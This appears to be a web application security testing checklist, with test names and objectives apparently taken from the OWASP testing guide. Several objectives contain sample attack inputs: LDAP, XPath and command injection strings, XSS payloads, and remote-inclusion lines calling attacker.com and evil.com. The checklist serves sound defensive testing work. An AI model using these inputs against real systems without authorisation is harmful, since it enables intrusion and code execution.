tests.name: Conduct Search Engine Discovery Reconnaissance for Information Leakage
tests.objectives: - Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's website) or indirectly (via third-party services).

tests.name: Fingerprint Web Server
tests.objectives: - Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.

tests.name: Review Webserver Metafiles for Information Leakage
tests.objectives:
- Identify hidden or obfuscated paths and functionality through the analysis of metadata files (robots.txt, <META> tag, sitemap.xml)
- Extract and map other information that could lead to a better understanding of the systems at hand.

tests.name: Enumerate Applications on Webserver
tests.objectives:
- Enumerate the applications within the scope that exist on a web server.
- Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers

tests.name: Review Webpage Content for Information Leakage
tests.objectives:
- Review webpage comments, metadata, and redirect bodies to find any information leakage.
- Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.
- Identify if source map files or other front-end debug files exist.

tests.name: Identify Application Entry Points
tests.objectives: - Identify possible entry and injection points through request and response analysis which covers hidden fields, parameters, methods HTTP header analysis

tests.name: Map Execution Paths Through Application
tests.objectives:
- Map the target application and understand the principal workflows.
- Use HTTP(s) Proxy Spider/Crawler feature aligned with application walkthrough

tests.name: Fingerprint Web Application Framework
tests.objectives:
- Fingerprint the components being used by the web applications.
- Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders, Error message.

tests.name: Fingerprint Web Application
tests.objectives: N/A, This content has been merged into: WSTG-INFO-08

tests.name: Map Application Architecture
tests.objectives:
- Understand the architecture of the application and the technologies in use.
- Identify application architecture whether on Application and Network components:
Applicaton: Web server, CMS, PaaS, Serverless, Microservices, Static storage, Third party services/APIs
Network and Security: Reverse proxy, IPS, WAF

tests.name: Test Network Infrastructure Configuration
tests.objectives:
- Review the applications' configurations set across the network and validate that they are not vulnerable.
- Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.

tests.name: Test Application Platform Configuration
tests.objectives:
- Ensure that defaults and known files have been removed.
- Review configuration and server handling (40*, 50*)
- Validate that no debugging code or extensions are left in the production environments.
- Review the logging mechanisms set in place for the application including Log Location, Log Storage , Log Rotation, Log Access Control, Log Review

tests.name: Test File Extensions Handling for Sensitive Information
tests.objectives:
- Dirbust sensitive file extensions, or extensions that might contain raw data (*e.g.* scripts, raw data, credentials, etc.).
- Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)
- Validate that no system framework bypasses exist on the rules set.

tests.name: Review Old Backup and Unreferenced Files for Sensitive Information
tests.objectives:
- Find and analyse unreferenced files that might contain sensitive information.
- Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename

tests.name: Enumerate Infrastructure and Application Admin Interfaces
tests.objectives:
- Identify hidden administrator interfaces and functionality.
- Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)

tests.name: Test HTTP Methods
tests.objectives:
- Enumerate supported HTTP methods using OPTIONS
- Test for access control bypass (GET->HEAD->FOO)
- Test HTTP method overriding techniques.

tests.name: Test HTTP Strict Transport Security
tests.objectives:
- Review the HSTS header and its validity.
- Identify HSTS header on Web server through HTTP response header:
curl -s -D- https://domain.com/ | grep Strict

tests.name: Test RIA Cross Domain Policy
tests.objectives: Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.

tests.name: Test File Permission
tests.objectives:
- Review and Identify any rogue file permissions.
- Identify configuration file whose permissions are set to world-readable from the installation by default.

tests.name: Test for Subdomain Takeover
tests.objectives:
- Enumerate all possible domains (previous and current).
- Identify forgotten or misconfigured domains.

tests.name: Test Cloud Storage
tests.objectives: - Assess that the access control configuration for the storage services is properly in place.

tests.name: Testing for Content Security Policy
tests.objectives: - Review the Content-Security-Policy header or meta element to identify misconfigurations.

tests.name: Test Path Confusion
tests.objectives: - Make sure application paths are configured correctly.

tests.name: Test Role Definitions
tests.objectives:
- Identify and document roles used by the application.
- Attempt to switch, change, or access another role.
- Review the granularity of the roles and the needs behind the permissions given.

tests.name: Test User Registration Process
tests.objectives:
- Verify that the identity requirements for user registration are aligned with business and security requirements.
- Validate the registration process.

tests.name: Test Account Provisioning Process
tests.objectives: - Verify which accounts may provision other accounts and of what type.

tests.name: Testing for Account Enumeration and Guessable User Account
tests.objectives:
- Review processes that pertain to user identification (*e.g.* registration, login, etc.).
- Enumerate users where possible through response analysis.

tests.name: Testing for Weak or Unenforced Username Policy
tests.objectives:
- Determine whether a consistent account name structure renders the application vulnerable to account enumeration.
- User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.
- Determine whether the application's error messages permit account enumeration.

tests.name: Testing for Credentials Transported over an Encrypted Channel
tests.objectives: N/A, This content has been merged into: WSTG-CRYP-03

tests.name: Testing for Default Credentials
tests.objectives: - Determine whether the application has any User accounts with default passwords.

tests.name: Testing for Weak Lock Out Mechanism
tests.objectives:
- Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.
- Evaluate the unlock mechanism's resistance to unauthorized account unlocking.

tests.name: Testing for Bypassing Authentication Schema
tests.objectives:
- Ensure that authentication is applied across all services that require it.
- Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection

tests.name: Testing for Vulnerable Remember Password
tests.objectives:
- Validate that the generated session is managed securely and do not put the user's credentials in danger  (e.g., cookie)
- Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?

tests.name: Testing for Browser Cache Weaknesses
tests.objectives:
- Review if the application stores sensitive information on the client-side.
- Review if access can occur without authorization.
- Check browser history issue by clicking "Back" button after logging out.
- Check browser cache issue from HTTP response headers (Cache-Control: no-cache)

tests.name: Testing for Weak Password Policy
tests.objectives:
- Determine the resistance of the application against brute Force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.
- Review whether new User accounts are created with weak or predictable passwords.

tests.name: Testing for Weak Security Question Answer
tests.objectives:
- Determine the complexity and how straight-forward the questions are (Weak pre-generated questions, Weak self-generated question)
- Assess possible user answers and brute force capabilities.

tests.name: Testing for Weak Password Change or Reset Functionalities
tests.objectives:
- Determine whether the password change and reset functionality allows accounts to be compromised.
- Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?)
- Test password change (Need old password?)

tests.name: Testing for Weaker Authentication in Alternative Channel
tests.objectives:
- Identify alternative authentication channels.
- Assess the security measures used and if any bypasses exists on the alternative channels.

tests.name: Testing Multi-Factor Authentication (MFA)
tests.objectives:
- Identify the type of MFA used by the application.
- Determine whether the MFA implementation is robust and secure.
- Attempt to bypass the MFA.

tests.name: Testing Directory Traversal File Include
tests.objectives:
- Identify injection points that pertain to path traversal.
- Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion)

tests.name: Testing for Bypassing Authorization Schema
tests.objectives:
- Assess if horizontal or vertical access is possible.
- Access to Administrative functions by force browsing (/admin/addUser)

tests.name: Testing for Privilege Escalation
tests.objectives:
- Identify injection points related to role/privilege manipulation. For example: Change some param groupid=2 to groupid=1
- Verify that it is not possible for a user to modify their privileges or roles inside the application
- Fuzz or otherwise attempt to bypass security measures.

tests.name: Testing for Insecure Direct Object References
tests.objectives:
- Identify points where object references may occur.
- Assess the access control measures and if they're vulnerable to IDOR. For example: Force changing parameter value (?invoice=123 -> ?invoice=456)

tests.name: Testing for OAuth Weaknesses
tests.objectives: - Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.

tests.name: Testing for Session Management Schema
tests.objectives:
- Gather session tokens, for the same user and for different users where possible.
- Analyze and ensure that enough randomness exists to stop session forging attacks.
- Modify cookies that are not signed and contain information that can be manipulated.

tests.name: Testing for Cookies Attributes
tests.objectives: - Ensure that the proper security configuration is set for cookies (HTTPOnly and Secure flag, Samesite=Strict)

tests.name: Testing for Session Fixation
tests.objectives:
- Analyze the authentication mechanism and its flow.
- Force cookies and assess the impact.
- Check whether the application renew the cookie after a successfully user authentication.

tests.name: Testing for Exposed Session Variables
tests.objectives:
- Ensure that proper encryption is implemented (Encryption & Reuse of session Tokens vulnerabilities).
- Review the caching configuration.
- Assess the channel and methods' security (Send sessionID with GET method ?)

tests.name: Testing for Cross Site Request Forgery
tests.objectives:
- Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.
- Conduct URL analysis, Direct access to functions without any token.

tests.name: Testing for Logout Functionality
tests.objectives:
- Assess the logout UI.
- Analyze the session timeout and if the session is properly killed after logout.

tests.name: Testing Session Timeout
tests.objectives: - Validate that a hard session timeout exists, after the timeout has passed, all session tokens should be destroyed or be unusable.

tests.name: Testing for Session Puzzling
tests.objectives:
- Identify all session variables.
- Break the logical flow of session generation.
- Check whether the application uses the same session variable for more than one purpose

tests.name: Testing for Session Hijacking
tests.objectives:
- Identify vulnerable session cookies.
- Hijack vulnerable cookies and assess the risk level.

tests.name: Testing JSON Web Tokens
tests.objectives:
- Determine whether the JWTs expose sensitive information.
- Determine whether the JWTs can be tampered with or modified.

tests.name: Testing for Reflected Cross Site Scripting
tests.objectives:
- Identify variables that are reflected in responses.
- Assess the input they accept and the encoding that gets applied on return (if any).

tests.name: Testing for Stored Cross Site Scripting
tests.objectives:
- Identify stored input that is reflected on the client-side.
- Assess the input they accept and the encoding that gets applied on return (if any).

tests.name: Testing for HTTP Verb Tampering
tests.objectives: N/A, This content has been merged into: WSTG-CONF-06

tests.name: Testing for HTTP Parameter Pollution
tests.objectives:
- Identify the backend and the parsing method used.
- Assess injection points and try bypassing input filters using HPP.

tests.name: Testing for SQL Injection
tests.objectives:
- Identify SQL injection points.
- Assess the severity of the injection and the level of access that can be achieved through it.

tests.name: Testing for LDAP Injection
tests.objectives:
- Identify LDAP injection points:
/ldapsearch?user=*
user=*user=*)(uid=*))(|(uid=*
pass=password
- Assess the severity of the injection:

tests.name: Testing for XML Injection
tests.objectives:
- Identify XML injection points with XML Meta Characters:
', " , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG
- Assess the types of exploits that can be attained and their severities.

tests.name: Testing for SSI Injection
tests.objectives:
- Identify SSI injection points (Presense of .shtml extension) with these characters:
< ! # = / . " - > and [a-zA-Z0-9]
- Assess the severity of the injection.

tests.name: Testing for XPath Injection
tests.objectives:
- Identify XPATH injection points by checking for XML error enumeration by supplying a single quote ('):
Username: ‘ or ‘1’ = ‘1
Password: ‘ or ‘1’ = ‘1

tests.name: Testing for IMAP SMTP Injection
tests.objectives:
- Identify IMAP/SMTP injection points (Header, Body, Footer) with special characters (i.e.: \, ‘, “, @, #, !, |)
- Understand the data flow and deployment structure of the system.
- Assess the injection impacts.

tests.name: Testing for Code Injection
tests.objectives:
- Identify injection points where you can inject code into the application. 
- Check LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource).
- Check RFI from malicious URL 
?page.php?file=http://attacker.com/malicious_page
- Assess the injection severity.

tests.name: Testing for Command Injection
tests.objectives:
- Identify and assess the command injection points with special characters (i.e.: | ; & $ > < ' !)
For example: ?doc=Doc1.pdf+|+Dir c:\

tests.name: Testing for Format String Injection
tests.objectives: - Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.

tests.name: Testing for Incubated Vulnerability
tests.objectives:
- Identify injections that are stored and require a recall step to the stored injection. (i.e.: CSV Injection, Blind Stored XSS, File Upload)
- Understand how a recall step could occur.
- Set listeners or activate the recall step if possible.

tests.name: Testing for HTTP Splitting Smuggling
tests.objectives:
- Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.
- Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.

tests.name: Testing for HTTP Incoming Requests
tests.objectives:
- Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.
- Monitor HTTP traffic without changes of end user Browser proxy or client-side application.

tests.name: Testing for Host Header Injection
tests.objectives:
- Assess if the Host header is being parsed dynamically in the application.
- Bypass security controls that rely on the header.

tests.name: Testing for Server-side Template Injection
tests.objectives:
- Detect template injection vulnerability points.
- Identify the templating engine.
- Build the exploit.

tests.name: Testing for Server-Side Request Forgery
tests.objectives:
- Identify SSRF injection points.
- Test if the injection points are exploitable.
- Asses the severity of the vulnerability.

tests.name: Testing for Mass Assignment
tests.objectives:
- Identify requests that modify objects
- Assess if it is possible to modify fields never intended to be modified from outside

tests.name: Testing for Improper Error Handling
tests.objectives:
- Identify existing error output (i.e.: Random files/folders (40x)
- Analyze the different output returned.

tests.name: Testing for Stack Traces
tests.objectives: N/A, This content has been merged into: WSTG-ERRH-01

tests.name: Testing for Weak Transport Layer Security
tests.objectives:
- Validate the server configuration (Identify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)
- Review the digital certificate's cryptographic strength and validity.
- Ensure that the TLS security is not bypassable and is properly implemented across the application.

tests.name: Testing for Padding Oracle
tests.objectives:
- Identify encrypted messages that rely on padding.
- Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.

tests.name: Testing for Sensitive Information Sent via Unencrypted Channels
tests.objectives:
- Identify sensitive information transmitted through the various channels.
- Assess the privacy and security of the channels used.
- Check sensitive data during the transmission:
• Information used in authentication (e.g. Credentials, PINs, Session
identifiers, Tokens, Cookies…)
• Information protected by laws, regulations or specific organizational
policy (e.g. Credit Cards, Customers data)

tests.name: Testing for Weak Encryption
tests.objectives: - Provide a guideline for the identification weak encryption or hashing uses and implementations.

tests.name: Test Business Logic Data Validation
tests.objectives:
- Identify data injection points.
- Validate that all checks are occurring on the back end and can't be bypassed.
- Attempt to break the format of the expected data and analyze how the application is handling it.

tests.name: Test Ability to Forge Requests
tests.objectives:
- Review the project documentation looking for guessable, predictable, or hidden functionality of fields.
- Insert logically valid data in order to bypass normal business logic workflow.

tests.name: Test Integrity Checks
tests.objectives:
- Review the project documentation for components of the system that move, store, or handle data.
- Determine what type of data is logically acceptable by the component and what types the system should guard against.
- Determine who should be allowed to modify or read that data in each component.
- Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.

tests.name: Test for Process Timing
tests.objectives:
- Review the project documentation for system functionality that may be impacted by time. Such as execution time or actions that
help users predict a future outcome or allow one to circumvent
any part of the business logic or workflow. For example, not
completing transactions in an expected time.
- Develop and execute the mis-use cases ensuring that attackers
can not gain an advantage based on any timing (Race Condition).

tests.name: Test Number of Times a Function Can Be Used Limits
tests.objectives:
- Identify functions that must set limits to the times they can be called.
- Assess if there is a logical limit set on the functions and if it is properly validated.
- For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.

tests.name: Testing for the Circumvention of Work Flows
tests.objectives:
- Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.
- Develop a misuse case and try to circumvent every logic flow identified.

tests.name: Test Defenses Against Application Misuse
tests.objectives:
- Generate notes from all tests conducted against the system.
- Review which tests had a different functionality based on aggressive input.
- Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.
- Measures that might indicate the application has in-built self-defense:
• Changed responses
• Blocked requests
• Actions that log a user out or lock their account

tests.name: Test Upload of Unexpected File Types
tests.objectives:
- Review the project documentation for file types that are rejected by the system.
- Verify that the unwelcomed file types are rejected and handled safely. Also, check whether the website only check for "Content-type" or file extension.
- Verify that file batch uploads are secure and do not allow any bypass against the set security measures.

tests.name: Test Upload of Malicious Files
tests.objectives:
- Identify the file upload functionality.
- Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.
- If documentation is not available then consider what would be appropriate based on the purpose of the application.
- Determine how the uploaded files are processed.
- Obtain or create a set of malicious files for testing.
- Try to upload the malicious files to the application and determine whether it is ac

tests.name: Test Payment Functionality
tests.objectives:
- Determine whether the business logic for the e-commerce functionality is robust.
- Understand how the payment functionality works.
- Determine whether the payment functionality is secure.

tests.name: Testing for DOM-Based Cross Site Scripting
tests.objectives:
- Identify DOM sinks.
- Build payloads that pertain to every sink type. 
For example: #<script>alert('xss')</script>

tests.name: Testing for JavaScript Execution
tests.objectives:
- Identify sinks and possible JavaScript injection points.
For example: ?javascript:alert(1)

tests.name: Testing for HTML Injection
tests.objectives:
- Identify HTML injection points and assess the severity of the injected content.
For example: page.html?user=<img%20src='aaa'%20onerror=alert(1)>

tests.name: Testing for Client-side URL Redirect
tests.objectives:
- Identify injection points that handle URLs or paths.
- Assess the locations that the system could redirect to (Open Redirect).
For example: ?redirect=www.fake-target.site

tests.name: Testing for CSS Injection
tests.objectives:
- Identify CSS injection points.
- Assess the impact of the injection.

tests.name: Testing for Client-side Resource Manipulation
tests.objectives:
- Identify sinks with weak input validation.
- Assess the impact of the resource manipulation.
For example: www.victim.com/#http://evil.com/js.js

tests.name: Testing Cross Origin Resource Sharing
tests.objectives:
- Identify endpoints that implement CORS.
- Ensure that the CORS configuration is secure or harmless.

tests.name: Testing for Cross Site Flashing
tests.objectives:
- Decompile and analyze the application's code.
- Assess sinks inputs and unsafe method usages.
For example: file.swf?lang=http://evil

tests.name: Testing for Clickjacking
tests.objectives:
- Understand security measures in place.
- Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.
- Assess how strict the security measures are and if they are bypassable.

tests.name: Testing WebSockets
tests.objectives:
- Identify the usage of WebSockets by inspecting ws:// or wss:// URI scheme.
- Assess its implementation by using the same tests on normal HTTP channels.

tests.name: Testing Web Messaging
tests.objectives:
- Assess the security of the message's origin.
- Validate that it's using safe methods and validating its input.

tests.name: Testing Browser Storage
tests.objectives:
- Determine whether the website is storing sensitive data in client-side storage.
- The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.

tests.name: Testing for Cross Site Script Inclusion
tests.objectives:
- Locate sensitive data across the system.
- Assess the leakage of sensitive data through various techniques.

tests.name: Testing for Reverse Tabnabbing
tests.objectives: N/A

tests.name: Testing GraphQL
tests.objectives:
- Assess that a secure and production-ready configuration is deployed.
- Validate all input fields against generic attacks.
- Ensure that proper access controls are applied.
